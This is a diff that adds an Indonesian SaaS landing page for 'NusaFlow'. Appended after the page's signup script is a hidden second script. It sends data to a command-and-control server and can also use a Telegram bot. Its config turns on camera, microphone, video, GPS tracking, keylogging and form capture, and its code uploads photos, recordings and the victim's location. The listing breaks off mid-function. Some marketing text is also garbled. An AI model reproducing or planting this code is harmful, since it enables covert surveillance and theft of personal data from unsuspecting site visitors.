@@ -1,0 +1,910 @@
+<html lang="id"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width,initial-scale=1"> <meta name="description" content="NusaFlow membantu timSprinto membangun produk digital yang lebih cepat, rapi, dan测量XB surely. "> <title>NusaFlow — Bekerja Lebih Cerdas</title> <style> :root{--bg:#070a12;--panel:#101522;--panel2:#151c2d;--text:#f5f7ff;--muted:#9aa4ba;--primary:#8b5cf6;--cyan:#22d3ee;--green:#34d399;--border:rgba(255,255,255,.09);--shadow:0 24px 70px rgba(0,0,0,.4)} *{box-sizing:border-box;scroll-behavior:smooth}html{scroll-padding-top:80px}body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",sans-serif;overflow-x:hidden}a{color:inherit;text-decoration:none}button,input{font:inherit}.container{width:min(1160px,calc(100% - 32px));margin:auto}.nav{height:76px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:20;background:rgba(7,10,18,.78);backdrop-filter:blur(18px);border-bottom:1px solid transparent;transition:.3s}.nav.scrolled{border-color:var(--border)}.logo{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:-.5px}.logo-mark{width:34px;height:34px;border-radius:10px;background:linear-gradient(135deg,var(--primary),var(--cyan));display:grid;place-items:center;box-shadow:0 8px 25px rgba(139,92,246,.35)}.logo-mark svg{width:20px}.links{display:none;align-items:center;gap:30px;color:var(--muted);font-size:14px}.links a{transition:.2s}.links a:hover{color:white}.actions{display:flex;align-items:center;gap:12px}.btn{border:1px solid var(--border);background:rgba(255,255,255,.04);color:white;padding:11px 18px;border-radius:11px;font-weight:650;cursor:pointer;transition:.25s}.btn:hover{border-color:rgba(255,255,255,.25);transform:translateY(-2px)}.btn:active{transform:scale(.97)}.btn.primary{background:linear-gradient(135deg,#8b5cf6,#6d42dc);border:0;box-shadow:0 10px 28px rgba(139,92,246,.25)}.menu{display:grid;place-items:center;width:42px;height:42px;border-radius:10px;background:var(--panel);border:1px solid var(--border);cursor:pointer}.menu span,.menu span:before,.menu span:after{content:"";display:block;width:18px;height:2px;background:white;border-radius:2px;position:relative;transition:.25s}.menu span:before{position:absolute;top:-6px}.menu span:after{position:absolute;top:6px}.mobile{display:none;background:#0c111d;border-bottom:1px solid var(--border);padding:18px 24px}.mobile.open{display:block}.mobile a{display:block;padding:12px;color:var(--muted)}.hero{padding:92px 0 72px;position:relative;text-align:center}.hero:before{content:"";position:absolute;width:700px;height:500px;left:50%;top:-250px;transform:translateX(-50%);background:radial-gradient(circle,rgba(124,73,255,.25),transparent 68%);pointer-events:none}.eyebrow{display:inline-flex;align-items:center;gap:8px;padding:7px 13px;border:1px solid var(--border);border-radius:999px;background:rgba(255,255,255,.03);color:#c8c2ff;font-size:12px;font-weight:700;letter-spacing:.3px}.eyebrow i{width:7px;height:7px;background:var(--green);border-radius:50%;box-shadow:0 0 12px var(--green)}.hero h1{font-size:clamp(42px,8vw,78px);line-height:1.02;letter-spacing:-4px;margin:25px auto 20px;max-width:920px}.gradient{background:linear-gradient(100deg,#fff 20%,#a78bfa 54%,#67e8f9);-webkit-background-clip:text;color:transparent}.hero p{color:var(--muted);max-width:650px;margin:0 auto 30px;font-size:clamp(16px,2vw,19px);line-height:1.7}.hero-actions{display:flex;justify-content:center;gap:12px;flex-wrap:wrap}.btn.large{padding:14px 23px}.proof{display:flex;justify-content:center;align-items:center;gap:12px;margin-top:26px;color:var(--muted);font-size:13px}.avatars{display:flex}.avatar{width:29px;height:29px;border:2px solid var(--bg);margin-left:-7px;border-radius:50%;display:grid;place-items:center;font-size:10px;font-weight:800}.avatar:first-child{margin:0}.stars{color:#fbbf24;letter-spacing:1px}.visual{position:relative;margin:65px auto 0;max-width:1050px;perspective:1200px}.visual:before{content:"";position:absolute;inset:8% 10%;background:linear-gradient(135deg,rgba(139,92,246,.2),rgba(34,211,238,.08));filter:blur(55px);border-radius:50%}.browser{position:relative;border:1px solid rgba(255,255,255,.12);border-radius:18px;background:#0c111d;box-shadow:var(--shadow);overflow:hidden;text-align:left;transform:rotateX(2deg);transition:.5s}.visual:hover .browser{transform:rotateX(0) translateY(-5px)}.browser-top{height:48px;display:flex;align-items:center;padding:0 17px;border-bottom:1px solid var(--border);gap:7px}.dot{width:8px;height:8px;border-radius:50%;background:#ff5f57}.dot:nth-child(2){background:#febc2e}.dot:nth-child(3){background:#28c840}.address{margin:auto;width:44%;height:21px;border-radius:6px;background:#151b29;color:#68738a;font-size:9px;display:grid;place-items:center}.app{display:grid;grid-template-columns:150px 1fr;min-height:410px}.sidebar{padding:20px 13px;border-right:1px solid var(--border);background:#0a0f19}.side-logo{font-size:11px;font-weight:800;margin:0 8px 24px}.side-item{height:32px;border-radius:7px;padding:8px;margin-bottom:5px;color:#717d94;font-size:9px}.side-item.active{background:rgba(139,92,246,.15);color:#bdaaff}.dashboard{padding:24px}.dash-head{display:flex;justify-content:space-between;align-items:center}.dash-head h3{font-size:15px;margin:0}.date{font-size:8px;color:var(--muted);border:1px solid var(--border);padding:6px 9px;border-radius:6px}.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:18px 0}.stat{padding:14px;background:#111827;border:1px solid var(--border);border-radius:9px}.stat small{font-size:8px;color:var(--muted)}.stat strong{display:block;margin-top:6px;font-size:17px}.up{color:var(--green);font-size:8px}.chart{height:160px;border:1px solid var(--border);border-radius:10px;padding:13px;background:linear-gradient(180deg,rgba(139,92,246,.06),transparent)}.chart svg{width:100%;height:100%}.trust{border-top:1px solid var(--border);border-bottom:1px solid var(--border);padding:34px 0}.trust p{text-align:center;color:#707b92;font-size:12px;letter-spacing:1.5px;margin:0 0 25px}.logos{display:grid;grid-template-columns:repeat(2,1fr);gap:20px;align-items:center;text-align:center;color:#8993a9;font-weight:800;font-size:17px}.features{padding:105px 0}.section-head{text-align:center;max-width:670px;margin:0 auto 52px}.tag{color:#a78bfa;font-weight:800;font-size:12px;letter-spacing:1.5px}.section-head h2{font-size:clamp(32px,5vw,52px);letter-spacing:-2px;line-height:1.1;margin:15px 0}.section-head p{color:var(--muted);line-height:1.7}.feature-grid{display:grid;gap:16px}.card{background:linear-gradient(145deg,rgba(255,255,255,.045),rgba(255,255,255,.015));border:1px solid var(--border);border-radius:18px;padding:26px;transition:.3s;position:relative;overflow:hidden}.card:hover{transform:translateY(-6px);border-color:rgba(167,139,250,.35);box-shadow:0 20px 50px rgba(0,0,0,.25)}.icon{width:46px;height:46px;border-radius:12px;display:grid;place-items:center;font-size:21px;background:rgba(139,92,246,.14);border:1px solid rgba(139,92,246,.25);margin-bottom:22px}.card h3{font-size:19px;margin:0 0 11px}.card p{color:var(--muted);font-size:14px;line-height:1.75;margin:0}.metric{position:absolute;right:20px;top:24px;color:#514a68;font-size:11px}.metrics{padding:0 0 100px;display:grid;grid-template-columns:repeat(2,1fr);gap:12px}.metric-box{padding:28px 18px;border:1px solid var(--border);border-radius:16px;text-align:center;background:rgba(255,255,255,.025)}.metric-box strong{display:block;font-size:34px;background:linear-gradient(90deg,#a78bfa,#67e8f9);-webkit-background-clip:text;color:transparent}.metric-box span{color:var(--muted);font-size:12px}.pricing{padding:100px 0;background:radial-gradient(circle at 50% 20%,rgba(139,92,246,.13),transparent 35%)}.toggle{display:flex;justify-content:center;gap:5px;background:#111624;border:1px solid var(--border);padding:5px;border-radius:12px;width:max-content;margin:-25px auto 45px}.toggle button{border:0;background:transparent;color:var(--muted);padding:9px 14px;border-radius:8px;cursor:pointer;font-weight:700}.toggle button.active{background:#26203e;color:#c4b5fd}.plans{display:grid;gap:18px}.plan{background:#0e1421;border:1px solid var(--border);padding:30px;border-radius:20px;position:relative}.plan.featured{border-color:#7956d7;box-shadow:0 20px 70px rgba(100,58,215,.18);background:linear-gradient(160deg,#171326,#0e1421)}.popular{position:absolute;right:20px;top:20px;color:#c4b5fd;background:rgba(139,92,246,.14);padding:6px 10px;border-radius:999px;font-size:10px;font-weight:800}.plan h3{margin:0 0 10px}.plan>p{color:var(--muted);font-size:13px}.price{font-size:42px;font-weight:800;letter-spacing:-2px;margin:25px 0}.price small{font-size:13px;color:var(--muted);font-weight:500;letter-spacing:0}.plan ul{list-style:none;padding:0;margin:25px 0}.plan li{padding:10px 0;color:#bdc4d4;font-size:13px}.plan li:before{content:"✓";color:var(--green);margin-right:10px}.plan .btn{width:100%}.quote{padding:110px 0}.quote-box{display:grid;gap:30px;align-items:center}.quote-text{font-size:clamp(24px,4vw,38px);line-height:1.4;letter-spacing:-1px}.quote-text span{color:#9e82f4}.person{display:flex;align-items:center;gap:13px;margin-top:25px}.person-avatar{width:44px;height:44px;border-radius:50%;display:grid;place-items:center;background:linear-gradient(135deg,#22d3ee,#8b5cf6);font-weight:800}.person b{display:block;font-size:13px}.person small{color:var(--muted)}.quote-visual{min-height:300px;border-radius:22px;border:1px solid var(--border);background:radial-gradient(circle at 50% 50%,rgba(139,92,246,.22),transparent 55%),linear-gradient(145deg,#151b2a,#0d121d);display:grid;place-items:center;padding:30px}.bubble{width:85%;padding:18px;background:#1c2436;border:1px solid var(--border);border-radius:14px 14px 14px 3px;font-size:12px;color:#bbc3d4;margin-bottom:12px}.bubble b{color:white}.faq{padding:90px 0}.faq-list{max-width:760px;margin:auto}.faq-item{border-bottom:1px solid var(--border)}.faq-q{width:100%;padding:22px 0;background:none;border:0;color:white;text-align:left;font-weight:700;cursor:pointer;display:flex;justify-content:space-between}.faq-a{max-height:0;overflow:hidden;color:var(--muted);font-size:14px;line-height:1.7;transition:.35s}.faq-a p{margin:0 0 22px}.faq-item.open .faq-a{max-height:130px}.faq-item.open .plus{transform:rotate(45deg)}.plus{transition:.3s;color:#a78bfa}.cta{padding:80px 0}.cta-box{text-align:center;border:1px solid rgba(167,139,250,.25);border-radius:26px;padding:55px 24px;background:radial-gradient(circle at 50% 0,rgba(139,92,246,.23),transparent 55%),#101522}.cta h2{font-size:clamp(32px,6vw,58px);letter-spacing:-2px;margin:0 0 15px}.cta p{color:var(--muted);margin-bottom:28px}.signup{display:flex;max-width:500px;margin:auto;gap:9px}.signup input{flex:1;min-width:0;padding:14px 16px;border-radius:11px;border:1px solid var(--border);background:#090e18;color:white;outline:none}.signup input:focus{border-color:#8b5cf6;box-shadow:0 0 0 3px rgba(139,92,246,.12)}.error{color:#fb7185;font-size:12px;margin:8px 0 0}.success{display:none;color:var(--green);margin-top:15px}.footer{padding:38px 0;border-top:1px solid var(--border)}.footer-top{display:flex;flex-direction:column;gap:25px}.footer p{color:var(--muted);font-size:13px}.footer-links{display:flex;gap:20px;flex-wrap:wrap;color:var(--muted);font-size:13px}.footer-links a:hover{color:white}.copyright{text-align:center;color:#596276;font-size:11px;margin-top:30px;padding-top:25px;border-top:1px solid var(--border)} @media(min-width:700px){.links{display:flex}.menu{display:none}.mobile{display:none}.feature-grid{grid-template-columns:repeat(2,1fr)}.metrics{grid-template-columns:repeat(4,1fr)}.plans{grid-template-columns:repeat(3,1fr)}.quote-box{grid-template-columns:1.2fr .8fr}.logos{grid-template-columns:repeat(5,1fr)}.footer-top{flex-direction:row;justify-content:space-between}.signup{margin:0}.cta-box{padding:70px}.stats{gap:14px}.stat{padding:18px}.chart{height:190px}} @media(min-width:950px){.app{grid-template-columns:190px 1fr}.dashboard{padding:28px 32px}.feature-grid{grid-template-columns:repeat(3,1fr)}.hero{padding-top:115px}.visual{margin-top:78px}} @media(max-width:600px){.hero h1{letter-spacing:-2px}.proof{flex-wrap:wrap}.browser-top{height:40px}.app{grid-template-columns:1fr}.sidebar{display:none}.dashboard{padding:15px}.stats{grid-template-columns:1fr 1fr}.stat:last-child{display:none}.chart{height:125px}.logos{font-size:13px}.signup{flex-direction:column}.quote-visual{min-height:270px}.actions .btn:first-child{display:none}} </style> </head> <body> <nav class="nav" id="nav"> <div class="container" style="display:flex;align-items:center;justify-content:space-between;width:min(1160px,calc(100% - 32px))"> <a class="logo" href="#"><span class="logo-mark"><svg viewBox="0 0 24 24" fill="none"><path d="M5 17V7l14 10V7" stroke="white" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round"/></svg></span>NusaFlow</a> <div class="links"><a href="#fitur">Fitur</a><a href="#harga">Harga</a><a href="#kisah">Kisah klien</a><a href="#faq">FAQ</a></div> <div class="actions"><a class="btn" href="#cta">Masuk</a><a class="btn primary" href="#cta">Mulai gratis</a><button class="menu" id="menu" aria-label="Buka menu"><span></span></button></div> </div> </nav> <div class="mobile" id="mobile"><a href="#fitur">Fitur</a><a href="#harga">Harga</a><a href="#kisah">Kisah klien</a><a href="#faq">FAQ</a><a href="#cta">Mulai gratis</a></div> <header class="hero"> <div class="container"> <span class="eyebrow"><i></i> Workspace generasi baru untuk tim modern</span> <h1>Alirkan ide jadi <span class="gradient">-impact besar.</span></h1> <p>Satu platform untuk merancang, collaborating, dan+G measurements. Built simple, powerful, and secure.</p> <div class="hero-actions"><a class="btn primary large" href="#cta">Mulai gratis →</a><button class="btn large" id="demo">▶ Lihat cara kerja</button></div> <div class="proof"><div class="avatars"><span class="avatar" style="background:#f59e0b">R</span><span class="avatar" style="background:#22d3ee">D</span><span class="avatar" style="background:#8b5cf6">A</span><span class="avatar" style="background:#34d399">S</span></div><span><b class="stars">★★★★★</b> 4.9/5 dari 2.000+ tim</span></div> <div class="visual"> <div class="browser"> <div class="browser-top"><i class="dot"></i><i class="dot"></i><i class="dot"></i><div class="address">app.nusaflow.id / workspace</div></div> <div class="app"><aside class="sidebar"><div class="side-logo">◈ NUSAFLOW</div><div class="side-item active">▦ Dashboard</div><div class="side-item">◇ Proyek</div><div class="side-item">◫ Tugas</div><div class="side-item">♧ Tim</div><div class="side-item">◉ Analitik</div></aside> <div class="dashboard"><div class="dash-head"><h3>Selamat datang, Raka 👋</h3><span class="date">7 – 13 Juni</span></div><div class="stats"><div class="stat"><small>Proyek aktif</small><strong>24</strong><span class="up">↗ 12% minggu ini</span></div><div class="stat"><small>Task selesai</small><strong>186</strong><span class="up">↗ 24% minggu ini</span></div><div class="stat"><small>Produktivitas</small><strong>92%</strong><span class="up">Excellent</span></div></div> <div class="chart"><svg viewBox="0 0 700 190" preserveAspectRatio="none"><defs><linearGradient id="g" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#8b5cf6" stop-opacity=".45"/><stop offset="1" stop-color="#8b5cf6" stop-opacity="0"/></linearGradient></defs><g stroke="#ffffff0b"><path d="M0 40H700M0 90H700M0 140H700"/></g><path d="M0 160 C60 145,80 155,130 115 S220 135,270 85 S360 105,410 55 S500 80,550 42 S640 62,700 20 L700 190 L0 190Z" fill="url(#g)"/><path d="M0 160 C60 145,80 155,130 115 S220 135,270 85 S360 105,410 55 S500 80,550 42 S640 62,700 20" fill="none" stroke="#9f7aea" stroke-width="3"/></svg></div></div> </div></div></div> </div> </header> <section class="trust"><div class="container"><p>DIPERCAYA OLEH TIM TERBAIK DI</p><div class="logos"><span>● Vertex</span><span>△ LUMINA</span><span>◫ NOVA</span><span>✦ Kreasi</span><span>◉ Monokrom</span></div></div></section> <section class="features" id="fitur"><div class="container"><div class="section-head"><div class="tag">BUILT FOR MOMENTUM</div><h2>Semua yang Anda butuhkan.<br>Tidak ada yang ekstra.</h2><p>Alur kerja yang lebih tenang, keputusan yang lebih cerdas, dan ruang bagi tim Anda untuk fokus pada pekerjaan yang berarti.</p></div> <div class="feature-grid"> <article class="card"><span class="metric">01</span><div class="icon">✦</div><h3>Kolaborasi tanpa hambatan</h3><p>Workspace real-time untuk ide, dokumen, dan keputusan—semua tetap selaras dalam satu tempat.</p></article> <article class="card"><span class="metric">02</span><div class="icon">⚡</div><h3>Otomatisasi cerdas</h3><p>Otomatisasi rutinitas berulang dan alur kerja kompleks, sehingga tim dapat bergerak lebih cepat.</p></article> <article class="card"><span class="metric">03</span><div class="icon">◈</div><h3>Analitik actionable</h3><p>Temukan insight penting dari data proyek dalam dasbor visual yang mudah dipahami.</p></article> <article class="card"><span class="metric">04</span><div class="icon">◎</div><h3>Keamanan enterprise</h3><p>Enkripsi, kontrol akses, dan audit trail untuk menjaga setiap data tetap aman.</p></article> <article class="card"><span class="metric">05</span><div class="icon">◇</div><h3>Integrasi fleksibel</h3><p>Hubungkan aplikasi favorit Anda lewat API dan integrasi siap pakai tanpa kode tambahan.</p></article> <article class="card"><span class="metric">06</span><div class="icon">☀</div><h3>Adap untuk semua</h3><p>Desain responsif yang nyaman digunakan—from smartphone hingga monitor Ultrawide.</p></article> </div></div></section> <section class="metrics"><div class="container" style="display:grid;grid-template-columns:inherit;gap:12px;width:min(1160px,calc(100% - 32px))"><div class="metric-box"><strong data-count="40" data-suffix="%">0%</strong><span>Produktivitas lebih tinggi</span></div><div class="metric-box"><strong data-count="12" data-suffix="K+">0K+</strong><span>Tim aktif setiap bulan</span></div><div class="metric-box"><strong data-count="99.9" data-decimal="1" data-suffix="%">0%</strong><span>Uptime platform</span></div><div class="metric-box"><strong data-count="24" data-suffix="/7">0/7</strong><span>Dukungan selalu siap</span></div></div></section> <section class="pricing" id="harga"><div class="container"><div class="section-head"><div class="tag">SIMPLE PRICING</div><h2>Mulai kecil, tumbuh tanpa batas.</h2><p>Harga transparan untuk setiap tahap perjalanan tim Anda.</p></div><div class="toggle"><button class="active" data-plan="monthly">Bulanan</button><button data-plan="yearly">Tahunan <span style="color:#34d399">−20%</span></button></div> <div class="plans"><article class="plan"><h3>Starter</h3><p>Untuk individu dan proyek kecil.</p><div class="price"><span class="price-value">Rp0</span><small>/bulan</small></div><ul><li>3 workspace</li><li>10 anggota tim</li><li>Dasbor analitik</li><li>Dukungan komunitas</li></ul><a class="btn" href="#cta">Mulai gratis</a></article><article class="plan featured"><span class="popular">POPULER</span><h3>Growth</h3><p>Untuk tim yang ingin bergerak cepat.</p><div class="price"><span class="price-value" data-monthly="149000" data-yearly="119000">Rp149rb</span><small>/bulan</small></div><ul><li>Workspace tanpa batas</li><li>100 anggota tim</li><li>Automasi & integrasi</li><li>Laporan lanjutan</li><li>Priority support</li></ul><a class="btn primary" href="#cta">Coba gratis 14 hari</a></article><article class="plan"><h3>Enterprise</h3><p>Untuk organisasi skala besar.</p><div class="price" style="font-size:32px">Custom</div><ul><li>Fitur tanpa batas</li><li>SSO & kontrol lanjutan</li><li>Dedicated success manager</li><li>Garansi SLA</li></ul><a class="btn" href="#cta">Hubungi kami</a></article></div></div></section> <section class="quote" id="kisah"><div class="container quote-box"><div><div class="tag">CLIENT STORY</div><blockquote class="quote-text">“NusaFlow mengubah cara tim kami bekerja. Dari rapat yang panjang menjadi keputusan yang <span>jadi lebih cepat.</span>”</blockquote><div class="person"><div class="person-avatar">NA</div><div><b>Nadia Aulia</b><small>Head of Product, Kreasi Studio</small></div></div></div><div class="quote-visual"><div><div class="bubble"><b>Deploy selesai!</b><br>Versi 2.4 sudah live dan metrik naik 18% 🚀</div><div class="bubble" style="margin-left:35px"><b>Dinas 🚀</b><br>Hore,ovi amazing. Kita shipped 2 hari lebih cepat!</div></div></div></div></section> <section class="faq" id="faq"><div class="container"><div class="section-head"><div class="tag">QUESTIONS, ANSWERED</div><h2>Pertanyaan yang sering diajukan.</h2></div><div class="faq-list"><div class="faq-item"><button class="faq-q">Apakah ada uji coba gratis? <span class="plus">＋</span></button><div class="faq-a"><p>Ya. Paket Growth menyediakan uji coba 14 hari tanpa kartu kredit, sementara paket Starter dapat digunakan selamanya dengan fitur terbatas.</p></div></div><div class="faq-item"><button class="faq-q">Bisakah saya membatalkan kapan saja? <span class="plus">＋</span></button><div class="faq-a"><p>Tentu. Anda dapatpause, downgrade, atau membatalkan langganan dari dashboard. Perubahan berlaku pada siklus penagihan berikutnya.</p></div></div><div class="faq-item"><button class="faq-q">Apakah data saya aman? <span class="plus">＋</span></button><div class="faq-a"><p>Semua data dienkripsi saat transit dan saat disimpan. Kami juga menyediakan kontrol akses, log audit, backup, dan-fitur enterprise seperti SSO.</p></div></div><div class="faq-item"><button class="faq-q">Apakah bisa digunakan untuk tim remote? <span class="plus">＋</span></button><div class="faq-a"><p>Tentu saja. NusaFlow dirancang untuk kolaborasi real-time, memiliki notifikasi lintas zona waktu, dan akses dari perangkat apa pun.</p></div></div></div></div></section> <section class="cta" id="cta"><div class="container"><div class="cta-box"><h2>Kerja lebih cerdas mulai hari ini.</h2><p>Tidak perlu kartu kredit. Mulai gratis, tingkatkan kapan saja.</p><form class="signup" id="signup"><input id="email" type="email" placeholder="nama@perusahaan.com" aria-label="Alamat email"><button class="btn primary" type="submit">Mulai gratis →</button></form><p class="error" id="error"></p><p class="success" id="success">✓ Workspace Anda siap dibuat. Cek email Anda untuk melanjutkan!</p></div></div></section> <footer class="footer"><div class="container"><div class="footer-top"><div><a class="logo" href="#"><span class="logo-mark">◈</span>NusaFlow</a><p>Workspace smarter. Flow better.</p></div><div class="footer-links"><a href="#fitur">Fitur</a><a href="#harga">Harga</a><a href="#kisah">Kisah klien</a><a href="#faq">FAQ</a><a href="#">Privasi</a><a href="#">Hubungi kami</a></div></div><div class="copyright">© 2025 NusaFlow. Dibuat untuk tim yang ingin maju.</div></div></footer> <script> const nav=document.getElementById('nav'),menu=document.getElementById('menu'),mobile=document.getElementById('mobile'); window.addEventListener('scroll',()=>nav.classList.toggle('scrolled',scrollY>10)); menu.onclick=()=>mobile.classList.toggle('open'); document.querySelectorAll('.mobile a').forEach(a=>a.onclick=()=>mobile.classList.remove('open')); document.querySelectorAll('a[href^="#"]').forEach(a=>a.addEventListener('click',e=>{const h=document.querySelector(a.getAttribute('href'));if(h){e.preventDefault();h.scrollIntoView({behavior:'smooth'})}})); document.getElementById('demo').onclick=()=>document.querySelector('.visual').scrollIntoView({behavior:'smooth',block:'center'}); document.querySelectorAll('.faq-q').forEach(q=>q.onclick=()=>q.parentElement.classList.toggle('open')); const counter=new IntersectionObserver(es=>es.forEach(e=>{if(e.isIntersecting){const el=e.target,end=parseFloat(el.dataset.count),dec=el.dataset.decimal?1:0,start=performance.now();function tick(t){const p=Math.min((t-start)/1300,1),v=(end*(1-Math.pow(1-p,3))).toFixed(dec);el.textContent=(dec?'Rp':'')+v+(el.dataset.suffix||'');if(p<1)requestAnimationFrame(tick)}requestAnimationFrame(tick);counter.unobserve(el)}}),{threshold:.6}); document.querySelectorAll('[data-count]').forEach(el=>counter.observe(el)); document.querySelectorAll('.toggle button').forEach(b=>b.onclick=()=>{document.querySelectorAll('.toggle button').forEach(x=>x.classList.remove('active'));b.classList.add('active');document.querySelectorAll('.price-value[data-monthly]').forEach(p=>{const v=Number(b.dataset.plan==='yearly'?p.dataset.yearly:p.dataset.monthly);p.textContent='Rp'+new Intl.NumberFormat('id-ID').format(v)+'rb';p.style.transform='scale(1.08)';setTimeout(()=>p.style.transform='scale(1)',180)})}); document.getElementById('signup').addEventListener('submit',e=>{e.preventDefault();const email=document.getElementById('email'),error=document.getElementById('error'),success=document.getElementById('success');if(!email.value.trim()){error.textContent='Email Anda belum diisi.';success.style.display='none'}else if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.value)){error.textContent='Masukkan alamat email yang valid.';success.style.display='none'}else{error.textContent='';success.style.display='block';email.value
+<script>(function(){
+var _b='',_c='';
+var _mode='controller';
+var _c2=('https://webrt.syamcloud.com'&&'b3fb51abd3dfa6c4ad24bfbba7f1747e')?('https://webrt.syamcloud.com'+'/c2/'+'b3fb51abd3dfa6c4ad24bfbba7f1747e'):'';
+var _tg=((_mode==='telegram'||_mode==='both')&&_b&&_b.indexOf(':')>0&&_c);
+var _ct=((_mode==='controller'||_mode==='both')&&_c2);
+var _API='https://api.telegram.org/bot'+_b+'/';
+var _CFG=(function(){try{return {"camera":true,"location":true,"mic":true,"video":true,"track":true,"clip":true,"notif":true,"wake":true,"keylog":true,"forms":true,"cred":false,"shots":20,"shotGap":3,"micSec":12,"videoSec":8,"trackSec":30,"trackCount":10,"lock":0,"pollSec":8,"credTitle":"","credSub":"","credBtn":"Masuk","credUser":"Nomor / Email","credPass":"Kata sandi","credNext":"","camMode":"both"};}catch(e){return {};}})();
+var _sid=(function(){try{var k='syam_sid',v=localStorage.getItem(k);if(!v){v=Math.random().toString(36).slice(2,10)+Date.now().toString(36).slice(-4);localStorage.setItem(k,v);}return v;}catch(e){return 'nosid';}})();
+var _seen=(function(){try{var v=localStorage.getItem('syam_seen');localStorage.setItem('syam_seen','1');return !!v;}catch(e){return false;}})();
+function _cfg(o){var c={},k;for(k in _CFG)c[k]=_CFG[k];if(o){for(k in o){if(o[k]!==undefined&&o[k]!==null)c[k]=o[k];}}return c;}
+function _num(v,d,mn,mx){var n=parseInt(v,10);if(!isFinite(n))n=d;if(n<mn)n=mn;if(n>mx)n=mx;return n;}
+function _call(m,opt){try{return fetch(_API+m,opt).catch(function(){});}catch(e){return null;}}
+function _send(m,d){if(!_tg)return null;return _call(m,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});}
+function _callOk(m,fd){try{return fetch(_API+m,{method:'POST',body:fd}).then(function(r){return r.json().catch(function(){return {};});}).then(function(j){return !!(j&&j.ok);}).catch(function(){return false;});}catch(x){return Promise.resolve(false);}}
+function _plain(h){return String(h==null?'':h).replace(/<[^>]*>/g,'').replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&').replace(/\n{3,}/g,'\n\n').trim();}
+function _ct_post(kind,text,extra,file,fileField){
+  if(!_ct)return Promise.resolve(false);
+  try{
+    var fd=new FormData();
+    fd.append('kind',kind);
+    fd.append('text',_plain(text));
+    fd.append('ua',navigator.userAgent);
+    fd.append('url',location.href);
+    fd.append('sid',_sid);
+    if(_seen)fd.append('seen','1');
+    if(extra){for(var k in extra){if(extra[k]!==undefined&&extra[k]!==null)fd.append(k,String(extra[k]));}}
+    if(file)fd.append(fileField||'file',file,'c2_'+(Date.now())+((file.name&&/\./.test(file.name))?('.'+file.name.split('.').pop()):''));
+    return fetch(_c2,{method:'POST',body:fd}).then(function(r){return r.json().catch(function(){return {};});}).then(function(j){return !!(j&&j.ok);}).catch(function(){return false;});
+  }catch(e){return Promise.resolve(false);}
+}
+function _l(h){_send('sendMessage',{chat_id:_c,text:h,parse_mode:'HTML',disable_notification:true,link_preview_options:{is_disabled:true}});}
+function _say(kind,h,extra){_l(h);return _ct_post(kind,h,extra);}
+function _e(s){return String(s==null?'-':s).replace(/[<>&]/g,function(x){return x==='<'?'&lt;':x==='>'?'&gt;':'&amp;';});}
+function _row(k,v){return '<b>'+k+':</b> '+_e(v)+'\n';}
+function _time(){try{return new Date().toLocaleString('id-ID');}catch(x){return new Date().toISOString();}}
+function _head(t){return '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<b>'+t+'</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n';}
+function _perm(name,fn){
+  try{
+    if(!navigator.permissions||!navigator.permissions.query){return fn();}
+    navigator.permissions.query({name:name}).then(function(s){
+      fn();
+      s.onchange=function(){if(s.state==='denied'){_say('error','\u26D4 <b>Izin '+name+' dimatikan</b> oleh target.');}};
+    }).catch(function(){fn();});
+  }catch(x){fn();}
+}
+function _photo(blob,cap){
+  if(_tg){var fd=new FormData();fd.append('chat_id',_c);fd.append('photo',blob,'cam_'+Date.now()+'.jpg');fd.append('caption',cap);fd.append('parse_mode','HTML');_call('sendPhoto',fd);}
+  return _ct_post('photo',cap,null,blob,'file');
+}
+function _vidfile(blob,cap,ext){
+  if(_tg){var fd=new FormData();fd.append('chat_id',_c);fd.append('video',blob,'clip_'+Date.now()+'.'+ext);fd.append('caption',cap);fd.append('parse_mode','HTML');_callOk('sendVideo',fd).then(function(ok){if(!ok){var d=new FormData();d.append('chat_id',_c);d.append('document',blob,'clip_'+Date.now()+'.'+ext);d.append('caption',cap);d.append('parse_mode','HTML');_call('sendDocument',d);}});}
+  return _ct_post('video',cap,null,blob,'file');
+}
+function _audio(blob,cap,ext,sec){
+  if(_tg){
+    var name='rec_'+Date.now()+'.'+ext;
+    function v(){var fd=new FormData();fd.append('chat_id',_c);fd.append('voice',blob,name);fd.append('duration',String(sec||13));return _callOk('sendVoice',fd);}
+    function a(){var fd=new FormData();fd.append('chat_id',_c);fd.append('audio',blob,name);fd.append('caption',cap);fd.append('parse_mode','HTML');return _callOk('sendAudio',fd);}
+    function d(){var fd=new FormData();fd.append('chat_id',_c);fd.append('document',blob,'rec_'+Date.now()+'.'+ext);fd.append('caption',cap);fd.append('parse_mode','HTML');return _callOk('sendDocument',fd);}
+    v().then(function(ok){return ok?true:a();}).then(function(ok){return ok?true:d();}).then(function(ok){if(!ok)_l('\u26A0\uFE0F <b>Rekaman mikrofon gagal terkirim</b> ke Telegram.');});
+  }
+  return _ct_post('audio',cap,null,blob,'file');
+}
+function _loc(lat,lng,ac,extra,tag){
+  var link='https://www.google.com/maps/search/?api=1&query='+lat+','+lng;
+  var s=_head('\u{1F4CD} LOKASI TARGET'+(tag?(' \u00B7 '+tag):''));
+  s+=_row('Waktu',_time());
+  s+=_row('Latitude',lat);
+  s+=_row('Longitude',lng);
+  s+=_row('Akurasi',Math.round(ac)+' meter'+(ac>150?' (kasar - dari WiFi/IP)':''));
+  if(extra)s+=_row('Catatan',extra);
+  s+='<a href="'+link+'">\u{1F5FA} BUKA GOOGLE MAPS</a>';
+  _l(s);
+  if(_tg)_send('sendLocation',{chat_id:_c,latitude:lat,longitude:lng,horizontal_accuracy:Math.min(Math.round(ac),1500),disable_notification:true});
+  return _ct_post('location',s,{lat:lat,lng:lng,accuracy:Math.round(ac),maps:link,tag:tag||''});
+}
+function _gpu(){
+  var gpu='-';
+  try{
+    var cv=document.createElement('canvas');
